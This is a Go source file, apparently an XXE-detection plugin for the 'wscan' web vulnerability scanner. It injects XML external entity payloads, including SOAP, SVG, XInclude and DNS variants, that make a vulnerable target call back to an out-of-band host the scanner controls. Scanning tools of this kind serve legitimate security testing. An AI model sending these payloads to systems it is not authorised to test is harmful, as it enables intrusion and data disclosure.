/**
* @Author: shaochuyu
* @Date: 5/7/2022 11:30
 */
package xxe

import (
	"bytes"
	"context"
	"fmt"
	"strings"
	"wscan/core/http"
	"wscan/core/model"
	"wscan/core/plugins/base"
	"wscan/core/reverse"
	logger "wscan/core/utils/log"
)

type Config struct {
	base.PluginBaseConfig `json:",inline" yaml:",inline"`
}

// BaseConfig 返回基本配置, 固定格式, 无需修改
func (c *Config) BaseConfig() *base.PluginBaseConfig {
	return &c.PluginBaseConfig
}

type XXE struct {
	base.PluginMixinInitConfig
	base.PluginMixinClose
}

// Close 关闭函数
func (p *XXE) Close() error {
	return nil
}

// DefaultConfig 返回默认配置, 需要填写插件的默认配置
func (p *XXE) DefaultConfig() base.PluginConfigInterface {
	config := &Config{PluginBaseConfig: base.PluginBaseConfig{
		Name:    "xxe",
		Enabled: true,
	}}
	return config
}

// Fingers 返回漏洞检测配置
func (p *XXE) Fingers() []*base.Finger {
	fingers := []*base.Finger{}
	fingers = append(fingers, &base.Finger{
		CheckAction: p.execAction,
		NeedReverse: true,
		Channel:     "web-generic",
		Binding:     &model.VulnBinding{ID: "xxe/dispatcher/default", Plugin: "xxe/xxe/echo", Category: "xxe/xxe/echo", Severity: model.SeverityCritical},
	})
	return fingers
}

// GetConfig 获取配置
func (p *XXE) GetConfig() base.PluginConfigInterface {
	return p.PluginMixinInitConfig.GetConfig()
}

// Init 插件初始化
func (p *XXE) Init(ctx context.Context, pci base.PluginConfigInterface, ab *base.ApolloBase) error {
	logger.Debug("XXE init")
	return p.PluginMixinInitConfig.Init(ctx, pci, ab)
}

// isXMLContentType checks if the Content-Type indicates XML content
// Covers application/xml, text/xml, application/soap+xml, etc.
func isXMLContentType(ct string) bool {
	ct = strings.ToLower(ct)
	return strings.Contains(ct, "xml") ||
		strings.Contains(ct, "soap") ||
		strings.Contains(ct, "xhtml")
}

// execAction 执行漏洞检测
func (p *XXE) execAction(ctx context.Context, ab *base.Apollo) error {
	flow := ab.GetTargetFlow()

	// Phase 1: Query/body parameter injection with URL-encoded payloads
	for _, param := range flow.Request.ParamsQueryAndBody() {
		// Basic payload with HTTP callback
		unit := ab.Reverse.Register(nil)
		payload := fmt.Sprintf("<?xml+version=\"1.0\"?><!DOCTYPE+ANY+[<!ENTITY+content+SYSTEM+\"%s\">]><a>&content;</a>", unit.GetVisitURL())
		parameter := http.Parameter{Position: param.Position, Key: param.Key, Value: payload}
		req := flow.Request.Mutate(&parameter)
		res, err := ab.HTTPClient.Respond(ctx, req)
		if err != nil {
			logger.Error(err)
			continue
		}
		// Check for in-band XXE echo (response contains /etc/passwd content)
		if res != nil && CheckXXEEcho(res.Text) {
			v := ab.NewWebVuln(req, res, &param)
			if v != nil {
				v.SetTargetURL(flow.Request.URL())
				v.Payload = payload
				v.Param = &parameter
				ab.OutputVuln(v)
			}
			return nil
		}
		// Out-of-band XXE detection via reverse callback
		unit.OnVisit(func(event *reverse.Event) error {
			v := ab.NewWebVuln(req, res, &param)
			if v != nil {
				v.SetTargetURL(flow.Request.URL())
				v.Payload = payload
				v.Param = &parameter
				ab.OutputVuln(v)
			}
			return nil
		})
		unit.Fetch(0)
	}

	// Phase 2: XML body injection for requests with XML Content-Type
	ct := flow.Request.ContentType()
	if isXMLContentType(ct) {
		// Basic XXE payload
		basicPayloads := []string{
			"<?xml version=\"1.0\"?><!DOCTYPE ANY [<!ENTITY content SYSTEM \"%s\">]><a>&content;</a>",
		}
		for _, payloadTmpl := range basicPayloads {
			unit := ab.Reverse.Register(nil)
			payload := fmt.Sprintf(payloadTmpl, unit.GetVisitURL())
			req := flow.Request.DeepClone()
			req.WithXMLBody(bytes.NewReader([]byte(payload)))
			res, err := ab.HTTPClient.Respond(ctx, req)
			if err != nil {
				logger.Error(err)
				continue
			}
			// Check for in-band echo
			if res != nil && CheckXXEEcho(res.Text) {
				v := ab.NewWebVuln(req, res, nil)
				if v != nil {
					v.SetTargetURL(flow.Request.URL())
					v.Payload = payload
					ab.OutputVuln(v)
				}
				return nil
			}
			unit.OnVisit(func(event *reverse.Event) error {
				v := ab.NewWebVuln(req, res, nil)
				if v != nil {
					v.SetTargetURL(flow.Request.URL())
					v.Payload = payload
					ab.OutputVuln(v)
				}
				return nil
			})
			unit.Fetch(0)
		}

		// Blind XXE: Parameterized DTD payloads
		for _, payload := range GetBlindXXEPayloads("") {
			unit := ab.Reverse.Register(nil)
			payload = fmt.Sprintf(payload, unit.GetVisitURL())
			req := flow.Request.DeepClone()
			req.WithXMLBody(bytes.NewReader([]byte(payload)))
			res, err := ab.HTTPClient.Respond(ctx, req)
			if err != nil {
				continue
			}
			unit.OnVisit(func(event *reverse.Event) error {
				v := ab.NewWebVuln(req, res, nil)
				if v != nil {
					v.SetTargetURL(flow.Request.URL())
					v.Payload = payload
					ab.OutputVuln(v)
				}
				return nil
			})
			unit.Fetch(0)
		}

		// SOAP context payloads
		for _, payload := range GetSOAPXXEPayloads("") {
			unit := ab.Reverse.Register(nil)
			payload = fmt.Sprintf(payload, unit.GetVisitURL())
			req := flow.Request.DeepClone()
			req.WithXMLBody(bytes.NewReader([]byte(payload)))
			res, err := ab.HTTPClient.Respond(ctx, req)
			if err != nil {
				continue
			}
			// Check for in-band echo in SOAP response
			if res != nil && CheckXXEEcho(res.Text) {
				v := ab.NewWebVuln(req, res, nil)
				if v != nil {
					v.SetTargetURL(flow.Request.URL())
					v.Payload = payload
					ab.OutputVuln(v)
				}
				return nil
			}
			unit.OnVisit(func(event *reverse.Event) error {
				v := ab.NewWebVuln(req, res, nil)
				if v != nil {
					v.SetTargetURL(flow.Request.URL())
					v.Payload = payload
					ab.OutputVuln(v)
				}
				return nil
			})
			unit.Fetch(0)
		}

		// SVG context payloads
		for _, payload := range GetSVGXXEPayloads("") {
			unit := ab.Reverse.Register(nil)
			payload = fmt.Sprintf(payload, unit.GetVisitURL())
			req := flow.Request.DeepClone()
			req.WithXMLBody(bytes.NewReader([]byte(payload)))
			res, err := ab.HTTPClient.Respond(ctx, req)
			if err != nil {
				continue
			}
			unit.OnVisit(func(event *reverse.Event) error {
				v := ab.NewWebVuln(req, res, nil)
				if v != nil {
					v.SetTargetURL(flow.Request.URL())
					v.Payload = payload
					ab.OutputVuln(v)
				}
				return nil
			})
			unit.Fetch(0)
		}

		// XInclude payloads (no DOCTYPE needed)
		for _, payload := range GetXIncludeXXEPayloads("") {
			unit := ab.Reverse.Register(nil)
			payload = fmt.Sprintf(payload, unit.GetVisitURL())
			req := flow.Request.DeepClone()
			req.WithXMLBody(bytes.NewReader([]byte(payload)))
			res, err := ab.HTTPClient.Respond(ctx, req)
			if err != nil {
				continue
			}
			// Check for in-band echo
			if res != nil && CheckXXEEcho(res.Text) {
				v := ab.NewWebVuln(req, res, nil)
				if v != nil {
					v.SetTargetURL(flow.Request.URL())
					v.Payload = payload
					ab.OutputVuln(v)
				}
				return nil
			}
			unit.OnVisit(func(event *reverse.Event) error {
				v := ab.NewWebVuln(req, res, nil)
				if v != nil {
					v.SetTargetURL(flow.Request.URL())
					v.Payload = payload
					ab.OutputVuln(v)
				}
				return nil
			})
			unit.Fetch(0)
		}

		// DNS-based XXE detection for targets that only allow DNS outbound
		unit := ab.Reverse.Register(nil)
		domainInfo, err := unit.GetQueryDomain()
		if err == nil && domainInfo != nil {
			dnsPayload := fmt.Sprintf(`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "%s">]><root>&xxe;</root>`, domainInfo.Domain)
			req := flow.Request.DeepClone()
			req.WithXMLBody(bytes.NewReader([]byte(dnsPayload)))
			ab.HTTPClient.Respond(ctx, req)
			unit.OnVisit(func(event *reverse.Event) error {
				v := ab.NewWebVuln(req, nil, nil)
				if v != nil {
					v.SetTargetURL(flow.Request.URL())
					v.Payload = dnsPayload
					ab.OutputVuln(v)
				}
				return nil
			})
			unit.Fetch(0)
		}
	}

	return nil
}
